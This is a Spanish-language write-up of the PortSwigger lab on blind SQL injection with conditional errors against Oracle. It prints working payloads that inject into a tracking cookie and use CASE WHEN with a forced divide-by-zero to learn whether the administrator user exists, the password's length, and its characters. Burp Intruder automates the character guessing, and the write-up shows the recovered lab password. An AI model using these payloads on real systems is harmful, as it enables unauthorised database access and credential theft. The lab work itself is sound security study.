# Blind SQL Injection with Conditional Errors

## 📌 Lab Information

- **Lab:** Blind SQL Injection with Conditional Errors
- **Categoría:** Blind SQL Injection
- **Técnica:** Error-Based SQLi
- **Motor BD:** Oracle

🔗 [Acceder al laboratorio](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)

---

## 🎯 Objetivo

Extraer la contraseña del usuario `administrator` utilizando respuestas basadas en errores del backend.

---

## 🔍 Identificación inicial

Interceptamos la petición y modificamos el `TrackingId`.

Probamos con comilla simple:

```sql
'
```

![Error SQL](Imagenes/pasted-image-20260427194341.png)

---

## 🔍 Validación

Probamos con doble comilla:

```sql
''
```

![200 OK](Imagenes/pasted-image-20260427194452.png)

Esto confirma:
- SQL Injection
- Input sin sanitización
- Query vulnerable

---

# 🚀 Oracle Error Oracle

Payload funcional:

```sql
'||(SELECT '' FROM dual)||'
```

![Payload Oracle](Imagenes/pasted-image-20260430143630.png)

---

## 🚀 Tabla inexistente

![Error 500](Imagenes/pasted-image-20260430143819.png)

El error 500 confirma que:
- la consulta se ejecuta
- podemos generar respuestas booleanas

---

# 🧠 Oracle CASE WHEN

Payload base:

```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE)
THEN TO_CHAR(1/0)
ELSE NULL
END FROM dual
```

---

## 🚀 Condición verdadera

```sql
||(SELECT CASE WHEN (1=1)
THEN TO_CHAR(1/0)
ELSE NULL END FROM dual)||
```

Resultado:
- HTTP 500

![Condición verdadera](Imagenes/pasted-image-20260521130636.png)

---

## 🚀 Condición falsa

```sql
||(SELECT CASE WHEN (1=2)
THEN TO_CHAR(1/0)
ELSE NULL END FROM dual)||
```

Resultado:
- HTTP 200

![Condición falsa](Imagenes/pasted-image-20260521130713.png)

---

# 🚀 Validación usuario administrador

```sql
||(SELECT CASE WHEN (
EXISTS(
SELECT * FROM users
WHERE username='administrator'))
THEN TO_CHAR(1/0)
ELSE NULL END FROM dual)||
```

![Administrador existe](Imagenes/pasted-image-20260521131114.png)

---

## 🚀 Enumeración longitud password

```sql
||(SELECT CASE WHEN (
EXISTS(
SELECT * FROM users
WHERE username='administrator'
AND LENGTH(password)=20))
THEN TO_CHAR(1/0)
ELSE NULL END FROM dual)||
```

![Length Password](Imagenes/pasted-image-20260521131723.png)

---

# 🚀 Fuerza bruta password

Usamos:

```sql
SUBSTR(password,1,1)
```

Ejemplo:

```sql
SUBSTR(password,1,1)='a'
```

---

## ⚙️ Intruder

Configuramos:
- Position
- Payloads
- Grep Match

![Position 1](Imagenes/pasted-image-20260521131822.png)

![Position 2](Imagenes/pasted-image-20260521131838.png)

![Grep Match](Imagenes/pasted-image-20260521131929.png)

---

## ✅ Password obtenida

```text
3yaj68vg3yb1pfoohq6g
```

![Password encontrada](Imagenes/pasted-image-20260521125945.png)

---

## 🔓 Acceso administrador

![Login administrador](Imagenes/pasted-image-20260521130154.png)

![Laboratorio resuelto](Imagenes/pasted-image-20260521130303.png)

---

## ✅ Resultado

Se logró:
- Explotar Blind SQLi
- Enumerar longitud
- Enumerar password
- Acceder como administrator
- Automatizar ataques con Burp Intruder
